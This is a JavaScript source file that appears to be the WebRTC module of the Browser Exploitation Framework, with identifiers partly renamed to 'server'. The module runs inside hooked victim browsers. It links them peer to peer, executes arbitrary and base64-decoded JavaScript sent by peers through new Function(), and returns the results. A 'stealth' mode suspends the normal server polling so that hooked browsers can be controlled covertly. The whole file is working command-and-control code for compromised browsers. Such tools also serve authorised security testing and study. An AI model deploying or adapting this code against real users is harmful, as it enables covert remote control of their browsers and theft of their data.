//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//


/**
 * Manage the WebRTC peer to peer communication channels.
 * This objects contains all the necessary client-side WebRTC components,
 * allowing browsers to use WebRTC to communicate with each other.
 * To provide signaling, the WebRTC extension sets up custom listeners.
 *  /rtcsignal - for sending RTC signalling information between peers
 *  /rtcmessage - for client-side rtc messages to be submitted back into server and logged.
 *
 * To ensure signaling gets back to the peers, the hook.js dynamic construction also includes
 * the signalling.
 *
 * This is all mostly a Proof of Concept
 * @namespace server.webrtc
 */

/** 
 * To handle multiple peers - we need to have a hash of Beefwebrtc objects. The key is the peer id. 
 * @memberof server.webrtc
*/
serverrtcs = {};
/** 
 * To handle multiple Peers - we have to have a global hash of RTCPeerConnection objects
 * these objects persist outside of everything else. The key is the peer id.
 * @memberof server.webrtc
 */
globalrtc = {}; 
/** 
 * stealth should only be initiated from one peer - this global variable will contain:
 * false - i.e not stealthed; or
 * <peerid> - i.e. the id of the browser which initiated stealth mode
 * @memberof server.webrtc
 */
rtcstealth = false; 
/** 
 * To handle multiple event channels - we need to have a global hash of these. The key is the peer id 
 * @memberof server.webrtc
*/
rtcrecvchan = {}; 

/**
 * Beefwebrtc object - wraps everything together for a peer connection
 * One of these per peer connection, and will be stored in the serverrtc global hash
 * @memberof server.webrtc
 * @param initiator 
 * @param peer 
 * @param turnjson 
 * @param stunservers 
 * @param verbparam 
 */
function Beefwebrtc(initiator,peer,turnjson,stunservers,verbparam) {
    this.verbose = typeof verbparam !== 'undefined' ? verbparam : false; // whether this object is verbose or not
    this.initiator = typeof initiator !== 'undefined' ? initiator : 0; // if 1 - this is the caller; if 0 - this is the receiver
    this.peerid = typeof peer !== 'undefined' ? peer : null; // id of this rtc peer
    this.turnjson = turnjson; // set of TURN servers in the format:
                              // {"username": "<username", "password": "<password>", "uris": [
                              //    "turn:<ip>:<port>?transport=<udp/tcp>",
                              //    "turn:<ip>:<port>?transport=<udp/tcp>"]}
    this.started = false; // Has signaling / dialing started for this peer
    this.gotanswer = false; // For the caller - this determines whether they have received an SDP answer from the receiver
    this.turnDone = false; // does the pcConfig have TURN servers added to it?
    this.signalingReady = false; // the initiator (Caller) is always ready to signal. So this sets to true during init
                                 // the receiver will set this to true once it receives an SDP 'offer'
    this.msgQueue = []; // because the handling of SDP signals may happen in any order - we need a queue for them
    this.pcConfig = null; // We set this during init
    this.pcConstraints = {"optional": [{"googImprovedWifiBwe": true}]} // PeerConnection constraints
    this.offerConstraints = {"optional": [], "mandatory": {}}; // Default SDP Offer Constraints - used in the caller
    this.sdpConstraints = {'optional': [{'RtpDataChannels':true}]}; // Default SDP Constraints - used by caller and receiver
    this.gatheredIceCandidateTypes = { Local: {}, Remote: {} }; // ICE Candidates
    this.allgood = false; // Is this object / peer connection with the nominated peer ready to go?
    this.dataChannel = null; // The data channel used by this peer
    this.stunservers = stunservers; // set of STUN servers, in the format:
                                    // ["stun:stun.l.google.com:19302","stun:stun1.l.google.com:19302"]
}

/**
 * Initialize the object
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.initialize = function() {
  if (this.peerid == null) {
    return 0; // no peerid - NO DICE
  }

  // Initialise the pcConfig hash with the provided stunservers
  var stuns = JSON.parse(this.stunservers);
  this.pcConfig = {"iceServers": [{"urls":stuns, "username":"user",
    "credential":"pass"}]};

  // We're not getting the browsers to request their own TURN servers, we're specifying them through Server
  // this.forceTurn(this.turnjson);
  this.turnDone = true;

  // Caller is always ready to create peerConnection.
  this.signalingReady = this.initiator;

  // Start .. maybe 
  this.maybeStart();

  // If the window is closed, send a signal to server .. this is not all that great, so just commenting out
  // window.onbeforeunload = function() {
  //   this.sendSignalMsg({type: 'bye'});
  // }

  return 1; // because .. yeah .. we had a peerid - this is good yar.
}

/** 
 * Forces the TURN configuration (we can't query that computeengine thing because it's CORS is restrictive)
 * These values are now simply passed in from the config.yaml for the webrtc extension
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.forceTurn = function(jason) {
    var turnServer = JSON.parse(jason);
    var iceServers = createIceServers(turnServer.uris,
                                      turnServer.username,
                                      turnServer.password);
    if (iceServers !== null) {
        this.pcConfig.iceServers = this.pcConfig.iceServers.concat(iceServers);
    }
    server.debug("Got TURN servers, will try and maybestart again..");
    this.turnDone = true;
    this.maybeStart();
}

/**
 * Try and establish the RTC connection
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.createPeerConnection = function() {
  server.debug('Creating RTCPeerConnnection with the following options:\n' +
            '  config: \'' + JSON.stringify(this.pcConfig) + '\';\n' +
            '  constraints: \'' + JSON.stringify(this.pcConstraints) + '\'.');
  try {
    // Create an RTCPeerConnection via the polyfill (webrtcadapter.js).
    globalrtc[this.peerid] = new RTCPeerConnection(this.pcConfig, this.pcConstraints);
    globalrtc[this.peerid].onicecandidate = this.onIceCandidate;
    server.debug('Created RTCPeerConnnection with the following options:\n' +
              '  config: \'' + JSON.stringify(this.pcConfig) + '\';\n' +
              '  constraints: \'' + JSON.stringify(this.pcConstraints) + '\'.');
    
  } catch (e) {
    server.debug('Failed to create PeerConnection, exception: ');
    server.debug(e);
    return;
  }

  // Assign event handlers to signalstatechange, iceconnectionstatechange, datachannel etc
  globalrtc[this.peerid].onsignalingstatechange = this.onSignalingStateChanged;
  globalrtc[this.peerid].oniceconnectionstatechange = this.onIceConnectionStateChanged;
  globalrtc[this.peerid].ondatachannel = this.onDataChannel;
  this.dataChannel = globalrtc[this.peerid].createDataChannel("sendDataChannel", {reliable:false});
}

/** 
 * When the PeerConnection receives a new ICE Candidate 
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.onIceCandidate = function(event) {
  var peerid = null;

  for (var k in serverrtcs) {
    if (serverrtcs[k].allgood === false) {
      peerid = serverrtcs[k].peerid;
    }
  }

  server.debug("Handling onicecandidate event while connecting to peer: " + peerid + ". Event received:");
  server.debug(event);

  if (event.candidate) {
    // Send the candidate to the peer via the Server signalling channel
    serverrtcs[peerid].sendSignalMsg({type: 'candidate',
                 label: event.candidate.sdpMLineIndex,
                 id: event.candidate.sdpMid,
                 candidate: event.candidate.candidate});
    // Note this ICE candidate locally
    serverrtcs[peerid].noteIceCandidate("Local", serverrtcs[peerid].iceCandidateType(event.candidate.candidate));
  } else {
    server.debug('End of candidates.');
  }
}

/**
 * For all rtc signalling messages we receive as part of hook.js polling - we have to process them with this function
 * This will either add messages to the msgQueue and try and kick off maybeStart - or it'll call processSignalingMessage
 * against the message directly
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.processMessage = function(message) {
  server.debug('Signalling Message - S->C: ' + JSON.stringify(message));
  var msg = JSON.parse(message);

  if (!this.initiator && !this.started) { // We are currently the receiver AND we have NOT YET received an SDP Offer
    server.debug('processing the message, as a receiver');
    if (msg.type === 'offer') { // This IS an SDP Offer
      server.debug('.. and the message is an offer .. ');
      this.msgQueue.unshift(msg); // put it on the top of the msgqueue
      this.signalingReady = true; // As the receiver, we've now got an SDP Offer, so lets set signalingReady to true
      this.maybeStart(); // Lets try and start again - this will end up with calleeStart() getting executed
    } else { // This is NOT an SDP Offer - as the receiver, just add it to the queue
      server.debug(' .. the message is NOT an offer .. ');
      this.msgQueue.push(msg);
    }
  } else if (this.initiator && !this.gotanswer) { // We are currently the caller AND we have NOT YET received the SDP Answer
    server.debug('processing the message, as the sender, no answers yet');
    if (msg.type === 'answer') { // This IS an SDP Answer
        server.debug('.. and we have an answer ..');
        this.processSignalingMessage(msg); // Process the message directly
        this.gotanswer = true; // We have now received an answer
        //process all other queued message...
        while (this.msgQueue.length > 0) {
            this.processSignalingMessage(this.msgQueue.shift());
        }
    } else { // This is NOT an SDP Answer - as the caller, just add it to the queue
        server.debug('.. not an answer ..');
        this.msgQueue.push(msg);
    }
  } else { // For all other messages just drop them in the queue
    server.debug('processing a message, but, not as a receiver, OR, the rtc is already up');
    this.processSignalingMessage(msg);
  } 
}

/** 
 * Send a signalling message ..
 * @memberof server.webrtc
 */ 
Beefwebrtc.prototype.sendSignalMsg = function(message) {
  var msgString = JSON.stringify(message);
  server.debug('Signalling Message - C->S: ' + msgString);
  server.net.send('/rtcsignal',0,{targetserverid: this.peerid, signal: msgString});
}

/**
 * Used to record ICS candidates locally
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.noteIceCandidate = function(location, type) {
  if (this.gatheredIceCandidateTypes[location][type])
    return;
  this.gatheredIceCandidateTypes[location][type] = 1;
  // updateInfoDiv();
}


/**
 * When the signalling state changes. We don't actually do anything with this except log it.
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.onSignalingStateChanged = function(event) {
  server.debug("Signalling has changed to: " + event.target.signalingState);
}

/**
 * When the ICE Connection State changes - this is useful to determine connection statuses with peers.
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.onIceConnectionStateChanged = function(event) {
  var peerid = null;

  for (k in globalrtc) {
    if ((globalrtc[k].localDescription.sdp === event.target.localDescription.sdp) && (globalrtc[k].localDescription.type === event.target.localDescription.type)) {
      peerid = k;
    }
  }

  server.debug("ICE with peer: " + peerid + " has changed to: " + event.target.iceConnectionState);

  // ICE Connection Status has connected - this is good. Normally means the RTCPeerConnection is ready! Although may still look for 
  // better candidates or connections
  if (event.target.iceConnectionState === 'connected') {
    //Send status to peer
    window.setTimeout(function() {
        serverrtcs[peerid].sendPeerMsg('ICE Status: '+event.target.iceConnectionState);
        serverrtcs[peerid].allgood = true;
        },1000);
  }

  // Completed is similar to connected. Except, each of the ICE components are good, and no more testing remote candidates is done.
  if (event.target.iceConnectionState === 'completed') {
    window.setTimeout(function() {
      serverrtcs[peerid].sendPeerMsg('ICE Status: '+event.target.iceConnectionState);
      serverrtcs[peerid].allgood = true;
    },1000);
  }

  if ((rtcstealth == peerid) && (event.target.iceConnectionState === 'disconnected')) {
    //I was in stealth mode, talking back to this peer - but it's gone offline.. come out of stealth
    rtcstealth = false;
    serverrtcs[peerid].allgood = false;
    server.net.send('/rtcmessage',0,{peerid: peerid, message: peerid + " - has apparently gotten disconnected"});
  } else if ((rtcstealth == false) && (event.target.iceConnectionState === 'disconnected')) {
    //I was not in stealth, and this peer has gone offline - send a message
    serverrtcs[peerid].allgood = false;
    server.net.send('/rtcmessage',0,{peerid: peerid, message: peerid + " - has apparently gotten disconnected"});
  }
  // We don't handle situations where a stealthed peer loses a peer that is NOT the peer that made it go into stealth
  // This is possibly a bad idea - @xntrik


}

/**
 * This is the function when a peer tells us to go into stealth by sending a dataChannel message of "!gostealth"
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.goStealth = function() {
    //stop the server updater
    rtcstealth = this.peerid; // this is a global variable
    server.updater.lock = true;
    this.sendPeerMsg('Going into stealth mode');

    setTimeout(function() {rtcpollPeer()}, server.updater.xhr_poll_timeout * 5);
}

/**
 * This is the actual poller when in stealth, it is global as well because we're using the setTimeout to execute it
 * @memberof server.webrtc
 */
rtcpollPeer = function() {
    if (rtcstealth == false) {
        //my peer has disabled stealth mode
        server.updater.lock = false;
        return;
    }

    server.debug('lub dub');

    serverrtcs[rtcstealth].sendPeerMsg('Stayin alive'); // This is the heartbeat we send back to the peer that made us stealth

    setTimeout(function() {rtcpollPeer()}, server.updater.xhr_poll_timeout * 5);
}

/** 
 * When a data channel has been established - within here is the message handling function as well
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.onDataChannel = function(event) {
  var peerid = null;
  for (k in globalrtc) {
    if ((globalrtc[k].localDescription.sdp === event.currentTarget.localDescription.sdp) && (globalrtc[k].localDescription.type === event.currentTarget.localDescription.type)) {
      peerid = k;
    }
  }

  server.debug("Peer: " + peerid + " has just handled the onDataChannel event");
  rtcrecvchan[peerid] = event.channel;

  // This is the onmessage event handling within the datachannel
  rtcrecvchan[peerid].onmessage = function(ev2) {
    server.debug("Received an RTC message from my peer["+peerid+"]: " + ev2.data);

    // We've received the command to go into stealth mode
    if (ev2.data == "!gostealth") {
        if (server.updater.lock == true) {
            setTimeout(function() {serverrtcs[peerid].goStealth()},server.updater.xhr_poll_timeout * 0.4);
        } else {
            serverrtcs[peerid].goStealth();
        }

    // The message to come out of stealth
    } else if (ev2.data == "!endstealth") {

      if (rtcstealth != null) {
        serverrtcs[rtcstealth].sendPeerMsg("Coming out of stealth...");
        rtcstealth = false;
      }

    // Command to perform arbitrary JS (while stealthed)
    } else if ((rtcstealth != false) && (ev2.data.charAt(0) == "%")) {
      server.debug('message was a command: '+ev2.data.substring(1) + ' .. and I am in stealth mode');
      serverrtcs[rtcstealth].sendPeerMsg("Command result - " + serverrtcs[rtcstealth].execCmd(ev2.data.substring(1)));

    // Command to perform arbitrary JS (while NOT stealthed)
    } else if ((rtcstealth == false) && (ev2.data.charAt(0) == "%")) {
      server.debug('message was a command - we are not in stealth. Command: '+ ev2.data.substring(1));
      serverrtcs[peerid].sendPeerMsg("Command result - " + serverrtcs[peerid].execCmd(ev2.data.substring(1)));

    // B64d command from the /cmdexec API
    } else if (ev2.data.charAt(0) == "@") {
      server.debug('message was a b64d command');

      var fn = new Function(atob(ev2.data.substring(1)));
      fn();
      if (rtcstealth != false) { // force stealth back on ?
        server.updater.execute_commands(); // FORCE execution while stealthed
        server.updater.lock = true;
      }


    // Just a plain text message .. (while stealthed)
    } else if (rtcstealth != false) {
      server.debug('received a message, apparently we are in stealth - so just send it back to peer['+rtcstealth+']');
      serverrtcs[rtcstealth].sendPeerMsg(ev2.data);

    // Just a plan text message (while NOT stealthed)
    } else {
      server.debug('received a message from peer['+peerid+'] - sending it back to server');
      server.net.send('/rtcmessage',0,{peerid: peerid, message: ev2.data});
    }
  } 
}

/**
 * How the browser executes received JS (this is pretty hacky)
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.execCmd = function(input) {
  var fn = new Function(input);
  var res = fn();
  return res.toString();
}

/**
 * Shortcut function to SEND a data messsage
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.sendPeerMsg = function(msg) {
  server.debug('sendPeerMsg to ' + this.peerid);
  this.dataChannel.send(msg);
}

/**
 * Try and initiate, will check that system hasn't started, and that signaling is ready, and that TURN servers are ready
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.maybeStart = function() {
  server.debug("maybe starting ... ");

  if (!this.started && this.signalingReady && this.turnDone) {
    server.debug('Creating PeerConnection.');
    this.createPeerConnection();

    this.started = true;

    if (this.initiator) {
      server.debug("Making the call now .. bzz bzz");
      this.doCall();
    } else {
      server.debug("Receiving a call now .. somebuddy answer da fone?");
      this.calleeStart();
    }

  } else {
    server.debug("Not ready to start just yet..");
  }
}

/** 
 * RTC - create an offer - the caller runs this, while the receiver runs calleeStart()
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.doCall = function() {
  var constraints = this.mergeConstraints(this.offerConstraints, this.sdpConstraints);
  var self = this;
  globalrtc[this.peerid].createOffer(this.setLocalAndSendMessage, this.onCreateSessionDescriptionError, constraints);
  server.debug('Sending offer to peer, with constraints: \n' +
             '  \'' + JSON.stringify(constraints) + '\'.');
}

/**
 * Helper method to merge SDP constraints
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.mergeConstraints = function(cons1, cons2) {
  var merged = cons1;
  for (var name in cons2.mandatory) {
    merged.mandatory[name] = cons2.mandatory[name];
  }
  merged.optional.concat(cons2.optional);
  return merged;
}

/**
 * Sets the local RTC session description, sends this information back (via signalling)
 * The caller uses this to set it's local description, and it then has to send this to the peer (via signalling)
 * The receiver uses this information too - and vice-versa - hence the signaling
 * 
 */
Beefwebrtc.prototype.setLocalAndSendMessage = function(sessionDescription) {
  var peerid = null;

  for (var k in serverrtcs) {
    if (serverrtcs[k].allgood === false) {
      peerid = serverrtcs[k].peerid;
    }
  }
  server.debug("For peer: " + peerid + " Running setLocalAndSendMessage...");

  globalrtc[peerid].setLocalDescription(sessionDescription, onSetSessionDescriptionSuccess, onSetSessionDescriptionError);
  serverrtcs[peerid].sendSignalMsg(sessionDescription);

  function onSetSessionDescriptionSuccess() {
    server.debug('Set session description success.');
  }

  function onSetSessionDescriptionError() {
    server.debug('Failed to set session description');
  }
}

/**
 * If the browser can't build an SDP
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.onCreateSessionDescriptionError = function(error) {
  server.debug('Failed to create session description: ' + error.toString());
}

/**
 * If the browser successfully sets a remote description
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.onSetRemoteDescriptionSuccess = function() {
  server.debug('Set remote session description successfully');
}

/**
 * Check for messages - which includes signaling from a calling peer - this gets kicked off in maybeStart()
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.calleeStart = function() {
  // Callee starts to process cached offer and other messages.
  while (this.msgQueue.length > 0) {
    this.processSignalingMessage(this.msgQueue.shift());
  }
}

/** 
 * Process messages, this is how we handle the signaling messages, such as candidate info, offers, answers
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.processSignalingMessage = function(message) {
  if (!this.started) {
    server.debug('peerConnection has not been created yet!');
    return;
  }

  if (message.type === 'offer') {
    server.debug("Processing signalling message: OFFER");
    if (navigator.mozGetUserMedia) { // Mozilla shim fuckn shit - since the new
                                     // version of FF - which no longer works
        server.debug("Moz shim here");
        globalrtc[this.peerid].setRemoteDescription(
            new RTCSessionDescription(message),
            function() {
              // globalrtc[this.peerid].createAnswer(function(answer) {
              //   globalrtc[this.peerid].setLocalDescription(

              var peerid = null;

              for (var k in serverrtcs) {
                if (serverrtcs[k].allgood === false) {
                  peerid = serverrtcs[k].peerid;
                }
              }

              globalrtc[peerid].createAnswer(function(answer) {
                globalrtc[peerid].setLocalDescription(
                    new RTCSessionDescription(answer),
                    function() {
                      serverrtcs[peerid].sendSignalMsg(answer);
                    },function(error) {
                      server.debug("setLocalDescription error: " + error);
                    });
              },function(error) {
                server.debug("createAnswer error: " +error);
              });
            },function(error) {
              server.debug("setRemoteDescription error: " + error);
            });
                          
    } else {
      this.setRemote(message);
      this.doAnswer();
    }
  } else if (message.type === 'answer') {
    server.debug("Processing signalling message: ANSWER");
    if (navigator.mozGetUserMedia) { // terrible moz shim - as for the offer
        server.debug("Moz shim here");
        globalrtc[this.peerid].setRemoteDescription(
          new RTCSessionDescription(message),
          function() {},
          function(error) {
            server.debug("setRemoteDescription error: " + error);
          });
    } else {
      this.setRemote(message);
    }
  } else if (message.type === 'candidate') {
    server.debug("Processing signalling message: CANDIDATE");
    var candidate = new RTCIceCandidate({sdpMLineIndex: message.label,
                                         candidate: message.candidate});
    this.noteIceCandidate("Remote", this.iceCandidateType(message.candidate));
    globalrtc[this.peerid].addIceCandidate(candidate, this.onAddIceCandidateSuccess, this.onAddIceCandidateError);
  } else if (message.type === 'bye') {
    this.onRemoteHangup();
  }
}

/**
 * Used to set the RTC remote session
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.setRemote = function(message) {
    globalrtc[this.peerid].setRemoteDescription(new RTCSessionDescription(message),
       this.onSetRemoteDescriptionSuccess, this.onSetSessionDescriptionError);
}

/** 
 * As part of the processSignalingMessage function, we check for 'offers' from peers. If there's an offer, we answer, as below
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.doAnswer = function() {
  server.debug('Sending answer to peer.');
  globalrtc[this.peerid].createAnswer(this.setLocalAndSendMessage, this.onCreateSessionDescriptionError, this.sdpConstraints);
}

/** 
 * Helper method to determine what kind of ICE Candidate we've received
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.iceCandidateType = function(candidateSDP) {
  if (candidateSDP.indexOf("typ relay ") >= 0)
    return "TURN";
  if (candidateSDP.indexOf("typ srflx ") >= 0)
    return "STUN";
  if (candidateSDP.indexOf("typ host ") >= 0)
    return "HOST";
  return "UNKNOWN";
}

/**
 * Event handler for successful addition of ICE Candidates
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.onAddIceCandidateSuccess = function() {
  server.debug('AddIceCandidate success.');
}

/**
 * Event handler for unsuccessful addition of ICE Candidates
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.onAddIceCandidateError = function(error) {
  server.debug('Failed to add Ice Candidate: ' + error.toString());
}

/** 
 * If a peer hangs up (we bring down the peerconncetion via the stop() method)
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.onRemoteHangup = function() {
  server.debug('Session terminated.');
  this.initiator = 0;
  // transitionToWaiting();
  this.stop();
}

/** 
 * Bring down the peer connection
 * @memberof server.webrtc
 */
Beefwebrtc.prototype.stop = function() {
  this.started = false; // we're no longer started
  this.signalingReady = false; // signalling isn't ready
  globalrtc[this.peerid].close(); // close the RTCPeerConnection option
  globalrtc[this.peerid] = null; // Remove it
  this.msgQueue.length = 0; // clear the msgqueue
  rtcstealth = false; // no longer stealth
  this.allgood = false; // allgood .. NAH UH
}

/**
 * The actual server.webrtc wrapper - this exposes only two functions directly - start, and status
 * These are the methods which are executed via the custom extension of the hook.js
 * @memberof server.webrtc
 */
server.webrtc = {
  // Start the RTCPeerConnection process
  start: function(initiator,peer,turnjson,stunservers,verbose) {
    if (peer in serverrtcs) {
      // If the RTC peer is not in a good state, try kickng it off again
      // This is possibly not the correct way to handle this issue though :/ I.e. we'll now have TWO of these objects :/
      if (serverrtcs[peer].allgood == false) {
        serverrtcs[peer] = new Beefwebrtc(initiator, peer, turnjson, stunservers, verbose);
        serverrtcs[peer].initialize();
      }
    } else {
      // Standard behaviour for new peer connections
      serverrtcs[peer] = new Beefwebrtc(initiator,peer,turnjson, stunservers, verbose);
      serverrtcs[peer].initialize();
    }
  },

  // Check the status of all my peers .. 
  status: function(me) {
    if (Object.keys(serverrtcs).length > 0) {
      for (var k in serverrtcs) {
        if (serverrtcs.hasOwnProperty(k)) {
          server.net.send('/rtcmessage',0,{peerid: k, message: "Status checking - allgood: " + serverrtcs[k].allgood});
        }
      }
    } else {
      server.net.send('/rtcmessage',0,{peerid: me, message: "No peers?"});
    }
  }
}
server.regCmp('server.webrtc');
